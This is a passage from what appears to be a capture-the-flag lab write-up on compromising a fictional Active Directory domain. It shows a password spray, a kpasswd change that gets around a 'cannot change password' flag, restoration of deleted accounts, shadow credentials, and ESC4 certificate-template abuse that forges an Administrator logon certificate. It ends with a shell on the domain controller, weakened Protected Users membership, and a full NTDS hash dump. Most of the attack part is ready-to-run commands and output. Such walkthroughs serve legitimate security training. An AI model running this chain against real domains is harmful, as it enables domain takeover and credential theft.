SMB         10.0.10.5       445    DC               [-] westbridge.hsm\a.price:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\d.murphy:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\l.cole:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\o.griffin:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\h.powell:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\i.bishop:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\c.hayes:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\j.walsh:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\p.sullivan:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\t.russell:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\c.anderson:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\b.wellington:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\svc_files:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\svc_web:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\svc_krb_t2:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\a.pherson:Welcome2Westbridge! STATUS_PASSWORD_MUST_CHANGE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\d.hoff:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\b.jones:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\a.owen:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\researchoperator:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\svc_webmonitor:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\j.bennett:Welcome2Westbridge! STATUS_LOGON_FAILURE
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\s.adams:Welcome2Westbridge! STATUS_LOGON_FAILURE
```

```
[-] westbridge.hsm\a.pherson:Welcome2Westbridge! STATUS_PASSWORD_MUST_CHANGE
```

`a.pherson` — the account that's been sitting in our dump since the first LDAP pull with **`Last PW Set: <never>`** — knows the default password, but it's expired-on-first-login. The account has never once been used.

Changing it hits a wall of quirks:

* `changepasswd.py` ➜ *"Target user is not allowed to change their own password"* (it falls back to a null-session bind and SAMR still refuses)
* `rpcclient` ➜ `NT_STATUS_PASSWORD_MUST_CHANGE` before any command even runs
* The account carries the **"User cannot change password"** flag, which SAMR respects

```bash
➜ changepasswd.py \
    westbridge.hsm/a.pherson:'Welcome2Westbridge!'@dc.westbridge.hsm \
    -newpass 'SecretMyth123!' \
    -dc-ip 10.0.10.5
Impacket v0.14.0.dev0+20260819.94127.f133bb88 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of westbridge.hsm\a.pherson
[*] Connecting to DCE/RPC as westbridge.hsm\a.pherson
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[-] Target user is not allowed to change their own password

➜ rpcclient -U 'westbridge.hsm/a.pherson%Welcome2Westbridge!' \
    dc.westbridge.hsm \
    -c 'SecretMyth123!'
Cannot connect to server.  Error was NT_STATUS_PASSWORD_MUST_CHANGE

## changepasswd.py (SAMR/RPC)  ➜ respects "cannot change password" flag ❌
## kpasswd (port 464)          ➜ Kerberos protocol, bypasses that flag ✅
```

The bypass is protocol-level: **kpasswd (port 464)** — the Kerberos-native password-change protocol — ignores that SAMR flag entirely:

```bash
➜ kpasswd a.pherson          # old: Welcome2Westbridge! ➜ new: SecretMyth123!
Password for a.pherson@WESTBRIDGE.HSM:
Enter new password:
Enter it again:
Password changed.

➜ nxc smb dc.westbridge.hsm \
    -u 'a.pherson' -p 'SecretMyth123!'
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\a.pherson:SecretMyth123!
```

## 17.2 What Is a.pherson? — The Lifecycle Account

![BloodHound — a.pherson memberships](/assets/images/westbridge-bh-apherson-membersof.png)

Member of **User Lifecycle Management** — the provisioning/cleanup role. And its outbound rights explain everything that follows:

![BloodHound — a.pherson outbound: GenericWrite over Deleted Objects + lifecycle targets](/assets/images/westbridge-bh-apherson-outbound.png)

`bloodyAD get writable` spells it out — including **write access to `CN=Deleted Objects`** itself, plus three *named* tombstones:

```bash
➜ getTGT.py westbridge.hsm/a.pherson:'SecretMyth123!'

➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u a.pherson \
    -k ccache=./a.pherson.ccache \
    get membership 'a.pherson'

distinguishedName: CN=Users,CN=Builtin,DC=westbridge,DC=hsm
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Domain Users,CN=Users,DC=westbridge,DC=hsm
objectSid: S-1-5-21-1978613116-3728955385-531918137-513
sAMAccountName: Domain Users

distinguishedName: CN=User Lifecycle Management,CN=Users,DC=westbridge,DC=hsm
objectSid: S-1-5-21-1978613116-3728955385-531918137-9513
sAMAccountName: UserLifecycleManagement

➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u a.pherson \
    -k ccache=./a.pherson.ccache \
    get writable

distinguishedName: CN=Users,DC=westbridge,DC=hsm
permission: CREATE_CHILD; WRITE

distinguishedName: CN=Deleted Objects,DC=westbridge,DC=hsm
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=westbridge,DC=hsm
permission: WRITE

distinguishedName: CN=a.pherson,CN=Users,DC=westbridge,DC=hsm
permission: WRITE

distinguishedName: CN=j.dillon\0ADEL:d6178188-a0f8-4d9f-868f-20124885e4cb,CN=Deleted Objects,DC=westbridge,DC=hsm
permission: WRITE

distinguishedName: CN=t.dixon\0ADEL:28a4ef10-bfa7-4c4a-a498-c803cca04cb7,CN=Deleted Objects,DC=westbridge,DC=hsm
permission: WRITE

distinguishedName: CN=a.collins\0ADEL:3c321a1e-1ef3-4619-a10b-e25882fc48c7,CN=Deleted Objects,DC=westbridge,DC=hsm
permission: WRITE

distinguishedName: DC=westbridge.hsm,CN=MicrosoftDNS,DC=DomainDnsZones,DC=westbridge,DC=hsm
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.westbridge.hsm,CN=MicrosoftDNS,DC=ForestDnsZones,DC=westbridge,DC=hsm
permission: CREATE_CHILD

distinguishedName: DC=westbridge-research.hsm,CN=MicrosoftDNS,DC=ForestDnsZones,DC=westbridge,DC=hsm
permission: CREATE_CHILD
```

Deleted-but-not-gone: three users in AD's recycle bin, and we hold restore rights over the container and each of them.

## 17.3 Tombstone Resurrection

```bash
bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u a.pherson \
    -k ccache=./a.pherson.ccache \
    set restore 'CN=j.dillon\0ADEL:d6178188-...,CN=Deleted Objects,DC=westbridge,DC=hsm'
[*] Restoring: CN=j.dillonADEL:d6178188-a0f8-4d9f-868f-20124885e4cb,CN=Deleted Objects,DC=westbridge,DC=hsm
[+] CN=j.dillon\0ADEL:d6178188-a0f8-4d9f-868f-20124885e4cb,CN=Deleted Objects,DC=westbridge,DC=hsm has been restored successfully under CN=j.dillon,CN=Users,DC=westbridge,DC=hsm


➜ for dn in \
    'CN=j.dillon\0ADEL:d6178188-a0f8-4d9f-868f-20124885e4cb,CN=Deleted Objects,DC=westbridge,DC=hsm' \
    'CN=t.dixon\0ADEL:28a4ef10-bfa7-4c4a-a498-c803cca04cb7,CN=Deleted Objects,DC=westbridge,DC=hsm' \
    'CN=a.collins\0ADEL:3c321a1e-1ef3-4619-a10b-e25882fc48c7,CN=Deleted Objects,DC=westbridge,DC=hsm'; do
    echo "[*] Restoring: $dn"
    bloodyAD \
        --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
        -u a.pherson \
        -k ccache=./a.pherson.ccache \
        set restore "$dn"
done
[*] Restoring: CN=j.dillonADEL:d6178188-a0f8-4d9f-868f-20124885e4cb,CN=Deleted Objects,DC=westbridge,DC=hsm
[+] CN=j.dillon\0ADEL:d6178188-a0f8-4d9f-868f-20124885e4cb,CN=Deleted Objects,DC=westbridge,DC=hsm has been restored successfully under CN=j.dillon,CN=Users,DC=westbridge,DC=hsm
[*] Restoring: CN=t.dixonADEL:28a4ef10-bfa7-4c4a-a498-c803cca04cb7,CN=Deleted Objects,DC=westbridge,DC=hsm
[+] CN=t.dixon\0ADEL:28a4ef10-bfa7-4c4a-a498-c803cca04cb7,CN=Deleted Objects,DC=westbridge,DC=hsm has been restored successfully under CN=t.dixon,CN=Users,DC=westbridge,DC=hsm
[*] Restoring: CN=a.collinsADEL:3c321a1e-1ef3-4619-a10b-e25882fc48c7,CN=Deleted Objects,DC=westbridge,DC=hsm
[+] CN=a.collins\0ADEL:3c321a1e-1ef3-4619-a10b-e25882fc48c7,CN=Deleted Objects,DC=westbridge,DC=hsm has been restored successfully under CN=a.collins,CN=Users,DC=westbridge,DC=hsm
```

Same for **t.dixon** and **a.collins** — three dead accounts walking again (password-less, but present). Fresh BloodHound collection to see what came back with them:

```bash
➜ env KRB5CCNAME=a.pherson.ccache \
rusthound-ce \
    -d westbridge.hsm -f dc.westbridge.hsm -k \
    --zip -c All
```

## 17.4 j.dillon ➜ IT TIER3 ➜ a.owen

The updated graph shows a.pherson's restored control — GenericWrite over the lifecycle targets including **j.dillon**:

![BloodHound — a.pherson GenericWrite post-restore (j.dillon visible)](/assets/images/westbridge-bh-apherson-generic-updated.png)

And j.dillon is the prize of the three: **GenericAll over the IT TIER3 OU** — the privileged tier we flagged back in [Section 9.4](#non-default-acl-edges) as controlled by a "hidden" account. The hidden account was an AD tombstone. We revived it into Tier 3:

![BloodHound — j.dillon GenericAll over IT TIER3](/assets/images/westbridge-bh-jdillion-genericall-tier3.png)


Shadow-credential j.dillon (certipy, same flow as svc_files), formalize the GenericAll, reset a Tier-3 member's password:

```bash
➜ env KRB5CCNAME=a.pherson.ccache \
certipy shadow auto \
    -u 'a.pherson' -k -no-pass \
    -account 'j.dillon' \
    -target dc.westbridge.hsm -dc-host dc.westbridge.hsm -dc-ip 10.0.10.5
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'j.dillon'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3ce8bcb086b948ef9795b9ebf5b73206'
[*] Adding Key Credential with device ID '3ce8bcb086b948ef9795b9ebf5b73206' to the Key Credentials for 'j.dillon'
[*] Successfully added Key Credential with device ID '3ce8bcb086b948ef9795b9ebf5b73206' to the Key Credentials for 'j.dillon'
[*] Authenticating as 'j.dillon' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'j.dillon@westbridge.hsm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'j.dillon.ccache'
[*] Wrote credential cache to 'j.dillon.ccache'
[*] Trying to retrieve NT hash for 'j.dillon'
[*] Restoring the old Key Credentials for 'j.dillon'
[*] Successfully restored the old Key Credentials for 'j.dillon'
[*] NT hash for 'j.dillon': 8bd7ff5bf2b9c11fcd54377575887b1d

➜ bloodyAD ... -u 'j.dillon' -k ccache=./j.dillon.ccache \
    add genericAll 'OU=IT Tier3,DC=WESTBRIDGE,DC=HSM' j.dillon
[+] j.dillon has now GenericAll on OU=IT Tier3,DC=WESTBRIDGE,DC=HSM

➜ bloodyAD ... -u 'j.dillon' -k ccache=./j.dillon.ccache \
    set password 'a.owen' 'SecretMyth123!'
[+] Password changed successfully!
```

## 17.5 Why a.owen Matters

![BloodHound — a.owen memberships incl. CA-MANAGER + cert template enrollment](/assets/images/westbridge-bh-aowen-outbound.png)

**a.owen is a member of CA-MANAGER** — administration over the `CA01-AD-CA` enterprise CA that's been in every TLS cert since [Section 1.2](#port-scans) — plus Enroll rights across the certificate templates. Tier 3 was the CA's front door all along.

The chain in one line: *default password ➜ kpasswd bypass ➜ lifecycle rights ➜ tombstone restore ➜ shadow credential ➜ Tier-3 password reset ➜ CA administration.* Every link was already in the directory; we just followed the resurrection trail.

# 18. PRIVESC DC01 — ESC4 on the CA

> Follow the white rabbit to DC. 🐇

The endgame starts with the CA. a.owen (CA-Manager) can't *enroll* on the juicy template — but the ESC4 path says he doesn't need to: he owns the template object itself.

## 18.1 Recon — Finding the Writable Template

```bash
➜ certipy find \
    -u 'a.owen@westbridge.hsm' -p 'SecretMyth123!' \
    -dc-ip 10.0.10.5 -dc-host dc.westbridge.hsm \
    -stdout | grep -i ManageCertificates
        ManageCertificates              : WESTBRIDGE.HSM\Administrators
# CA-level manage rights = Admins only. So we look one level down: the TEMPLATE.

➜ bloodyAD -H dc.westbridge.hsm -i 10.0.10.5 \
    -d westbridge.hsm \
    -u a.owen -p 'SecretMyth123!' \
    -s get writable --partition CONFIGURATION

distinguishedName: CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm
permission: WRITE
OWNER: WRITE
DACL: WRITE
```

Two different layers here, and the difference matters:

* The **CA object** (`pKIEnrollmentService`) says `ManageCertificates: Administrators` — that
  governs *approving/revoking issued certificates*. Locked for us. Fine.
* The **template object** (`CN=Certificate Templates`, in the CONFIGURATION partition) is a
  plain AD object a.owen can **WRITE, take ownership of, and rewrite the DACL** on.

`SmartCardAuthentication` — remember what this template *is*: EKU `Smart Card Logon` + `Client Authentication`. A certificate from it doesn't just encrypt traffic; **it logs you into the domain as whoever it names.** And we hold write access to its definition. That's textbook **ESC4** ("vulnerable template ACL").

## 18.2 Reading the Guard Rail — msPKI-Certificate-Name-Flag

Before writing anything, read the template's current rules:

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u a.owen -p 'SecretMyth123!' \
    get object 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' \
    --attr msPKI-Certificate-Name-Flag

distinguishedName: CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm
msPKI-Certificate-Name-Flag: 0

# Alt
➜ LDAPTLS_REQCERT=never ldapsearch -LLL -x -H ldaps://10.0.10.5 \
    -D 'a.owen@westbridge.hsm' -w 'SecretMyth123!' \
    -b 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' \
    msPKI-Certificate-Name-Flag
msPKI-Certificate-Name-Flag: 0
```

### What this attribute actually decides

Every certificate needs a *name* — the identity baked into it (Subject and/or SAN). For a logon certificate that name is everything: Kerberos PKINIT maps the cert's SAN/UPN straight onto a domain account. So every cert template must answer one question:

> **Who chooses the identity inside the certificate — the requester or Active Directory?**

That answer isn't prose; it's a **bitmask** stored in `msPKI-Certificate-Name-Flag`. Bitmask means: each bit in the number toggles one independent behavior, so you decode the value by its bits rather than reading it as "the number 5." The flags that matter:

| Value | Bits set | Flag name(s) | Plain English |
|---|---|---|---|
| **0** | *(none)* | no flags — **DEFAULT** | Subject is built automatically from the requester's AD account. You get a certificate for *you*, and nothing else. |
| **1** | 2^0 | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` | *"Supply in the request"* for the **Subject Name** — the requester types any subject they want. |
| **2** | 2^1 | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME` | *"Supply in the request"* for the **SAN** — requester supplies e.g. `UPN: administrator@westbridge.hsm`. |
| **3** | 2^0+2^1 | both above combined | Requester supplies **Subject AND SAN**. |
| **4** | 2^2 | `CT_FLAG_OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME` | On renewal, subject/SAN are copied from the old certificate being renewed. |

(Values combine because they're bits — value 5 = flag-1 + flag-4.)

### Why `0` was the lock — and flipping it is the key

With our current value `0`: the CA names every issued certificate after *the person requesting it*. If a.owen enrolls today, he gets a beautiful Smart-Card-Logon certificate… for **a.owen**. Perfectly useless for escalation.

But we don't have to live with `0` — **we own the template's DACL.** Setting the flag to `1` rewrites that one sentence of policy into: *"the requester supplies whatever identity they like."* From then on, a request with SAN `administrator@westbridge.hsm` gets issued a valid logon certificate for Administrator — signed by the domain's own CA, trusted by every DC, because as far as AD can tell the process worked exactly as configured. Nobody broke a rule; we rewrote the rulebook first.

This is also why ESC4 keeps beating "just find an ESC1 template": any template with dangerous EKUs becomes ESC1 the moment someone with template-WRITE flips one bit.


## 18.3 Execution — Flip, Enroll, Authenticate

```bash
# Flip the flag: 0 -> 1 (ENROLLEE_SUPPLIES_SUBJECT)
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u a.owen -p 'SecretMyth123!' \
    set object 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' \
    msPKI-Certificate-Name-Flag -v 1
[+] CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm's msPKI-Certificate-Name-Flag has been updated

# read the template rules
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u a.owen -p 'SecretMyth123!' \
    get object 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' \
    --attr msPKI-Certificate-Name-Flag

distinguishedName: CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm
msPKI-Certificate-Name-Flag: 1

# Ensure enroll rights (GenericAll implies the Enroll control-access right)
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm \
    -u a.owen -p 'SecretMyth123!' \
    add genericAll 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' a.owen
[+] a.owen has now GenericAll on CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm

# Get SID
➜ nxc ldap dc.westbridge.hsm \
    -u 'a.owen' -p 'SecretMyth123!' \
    --get-sid
LDAP        10.0.10.5       389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:westbridge.hsm) (signing:None) (channel binding:When Supported)
LDAP        10.0.10.5       389    DC               [+] westbridge.hsm\a.owen:SecretMyth123!
LDAP        10.0.10.5       389    DC               Domain SID S-1-5-21-1978613116-3728955385-531918137

# Enroll AS ADMINISTRATOR via SAN (+ the RID-500 SID for the security extension)
➜ certipy req -u 'a.owen@westbridge.hsm' -p 'SecretMyth123!' \
    -ca CA01-AD-CA -template SmartCardAuthentication \
    -upn administrator@westbridge.hsm \
    -sid 'S-1-5-21-1978613116-3728955385-531918137-500' \
    -dc-ip 10.0.10.5
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@westbridge.hsm'
[*] Certificate object SID is 'S-1-5-21-1978613116-3728955385-531918137-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

# PKINIT with the cert -> recover Administrator's NT hash from the TGT PAC
➜ certipy auth -pfx administrator.pfx -dc-ip 10.0.10.5
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@westbridge.hsm'
[*]     SAN URL SID: 'S-1-5-21-1978613116-3728955385-531918137-500'
[*]     Security Extension SID: 'S-1-5-21-1978613116-3728955385-531918137-500'
[*] Using principal: 'administrator@westbridge.hsm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@westbridge.hsm': aad3b435b51404eeaad3b435b51404ee:23f398d3fa12625a1dab8a2c19cdd96b
```

Housekeeping: restore `msPKI-Certificate-Name-Flag = 0` and drop the a.owen ACE afterwards — keeps the lab re-runnable and your trail clean.

## 18.4 Execution — Administrator's Hash, Domain Done

The flag flip + enrollment go through without a hiccup, and `certipy auth` cashes the certificate in — note how every identity baked into the cert points at RID 500:

```
➜ certipy auth -pfx administrator.pfx -dc-ip 10.0.10.5
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@westbridge.hsm'
[*]     SAN URL SID: 'S-1-5-21-1978613116-3728955385-531918137-500'
[*]     Security Extension SID: 'S-1-5-21-1978613116-3728955385-531918137-500'
[*] Using principal: 'administrator@westbridge.hsm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@westbridge.hsm': aad3b435b51404eeaad3b435b51404ee:23f398d3fa12625a1dab8a2c19cdd96b
```

(That SID triple-check inside the PAC is also *why* we grabbed the domain SID back in [Section 8](#authenticated-enumeration-svc_mssql) — the KDC validates that the SAN's UPN/SID actually resolve to a real account before minting the TGT. Forged identity, genuine validation.)

Shell as the big boss:

```bash
➜ env KRB5CCNAME=administrator.ccache \
evil_winrmexec -k dc.westbridge.hsm -dc-ip 10.0.10.5

PS C:\Users\Administrator\Documents> whoami; hostname
westbridge\administrator
DC

PS > dir ..\Desktop
Database.kdb                    🡐 KeePass vault (noted for later)
Forest_Trust_Validation.eml     🡐 trust-related mail (also for later)

PS > type ..\Desktop\flag.txt
Flag05[ADCS_ESC_DC_0wned]
```

```bash
PS C:\Users\Administrator\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                        Type             SID                                          Attributes
================================================= ================ ============================================ ===============================================================
Everyone                                          Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                            Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                     Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access           Alias            S-1-5-32-574                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access        Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                              Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                  Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                    Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
WESTBRIDGE\Protected Users                        Group            S-1-5-21-1978613116-3728955385-531918137-525 Mandatory group, Enabled by default, Enabled group
WESTBRIDGE\Group Policy Creator Owners            Group            S-1-5-21-1978613116-3728955385-531918137-520 Mandatory group, Enabled by default, Enabled group
WESTBRIDGE\Domain Admins                          Group            S-1-5-21-1978613116-3728955385-531918137-512 Mandatory group, Enabled by default, Enabled group
WESTBRIDGE\Enterprise Admins                      Group            S-1-5-21-1978613116-3728955385-531918137-519 Mandatory group, Enabled by default, Enabled group
WESTBRIDGE\Schema Admins                          Group            S-1-5-21-1978613116-3728955385-531918137-518 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity        Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
WESTBRIDGE\Denied RODC Password Replication Group Alias            S-1-5-21-1978613116-3728955385-531918137-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\This Organization Certificate        Well-known group S-1-5-65-1                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level              Label            S-1-16-12288

# Remove the Administrator from the Protected Users Group
PS C:\Users\Administrator\Desktop> net group "Protected Users" Administrator /delete
The command completed successfully.
```

**Flag 5 captured. All five hosts owned; the westbridge.hsm domain is done.**

| Host | Status | Flag |
|---|---|---|
| SQL 10.0.10.20 | SYSTEM | Flag01 |
| FILES 10.0.10.15 | local Administrator | Flag02 |
| WEB 10.0.10.10 | root | Flag03 |
| HELPDESK-WS 10.0.10.25 | local admin via s.harrison | Flag04 |
| **DC 10.0.10.5** | **Domain Admin via ESC4** | **Flag05** |

And the Administrator ccache isn't just a shell — it's a skeleton key. Next section: point it toward DC02 across the research forest trust.

## 18.5 Post-Exploitation — Full NTDS Dump

Domain Admin on the DC means one thing before anything else: the whole domain's credential database. First verification that the cached ticket still opens doors, then the dump:

```bash
➜ env KRB5CCNAME=administrator.ccache \
nxc smb dc.westbridge.hsm -k --use-kcache --ntds
SMB         dc.westbridge.hsm 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         dc.westbridge.hsm 445    DC               [+] WESTBRIDGE.HSM\administrator from ccache (Pwn3d!)
SMB         dc.westbridge.hsm 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc.westbridge.hsm 445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:23f398d3fa12625a1dab8a2c19cdd96b:::
SMB         dc.westbridge.hsm 445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         dc.westbridge.hsm 445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1cee08cdd3d89d81ddfea7d2449a5f87:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\m.thompson:1103:aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\r.anderson:1104:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\c.wilson:1105:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\d.parker:1106:aad3b435b51404eeaad3b435b51404ee:da953882db59522e02821ebcb9e37bd5:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\s.harrison:1107:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\svc_legacy:9458:aad3b435b51404eeaad3b435b51404ee:f7c14b8b4a2d4358441e21d157f79fc1:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\svc_mssql:9459:aad3b435b51404eeaad3b435b51404ee:025d7fd412286bef880ba432685d6d8f:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\o.carter:9476:aad3b435b51404eeaad3b435b51404ee:4fe695535e4077637affec319ec8d3da:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\n.brooks:9477:aad3b435b51404eeaad3b435b51404ee:3669aa3805a86b130d16faee8744ab1f:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\e.foster:9478:aad3b435b51404eeaad3b435b51404ee:dc3f51f1bcca763a40d6a106a2de8903:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\l.reed:9479:aad3b435b51404eeaad3b435b51404ee:672efd680f2778d87bfeff76ab7fd2a2:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\c.ward:9480:aad3b435b51404eeaad3b435b51404ee:4b28739648299231012dd307f3e6f930:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\a.price:9481:aad3b435b51404eeaad3b435b51404ee:56d0bb9851055d17319709b1cb4b76c8:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\d.murphy:9482:aad3b435b51404eeaad3b435b51404ee:9a6d0e7d896b2c08d5858b57ab726904:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\l.cole:9483:aad3b435b51404eeaad3b435b51404ee:ce2c950b771a2e4cab88bdfd1703b291:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\o.griffin:9484:aad3b435b51404eeaad3b435b51404ee:2dc6975169d4a44ce3b2c74b2c5d7b4b:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\h.powell:9485:aad3b435b51404eeaad3b435b51404ee:5ac6af3ee3444d40993290021c190974:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\i.bishop:9486:aad3b435b51404eeaad3b435b51404ee:3011d7703ecde82a688fac9c852d4833:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\c.hayes:9487:aad3b435b51404eeaad3b435b51404ee:32b6f91155ea1a2f002a7443fa65ad73:::
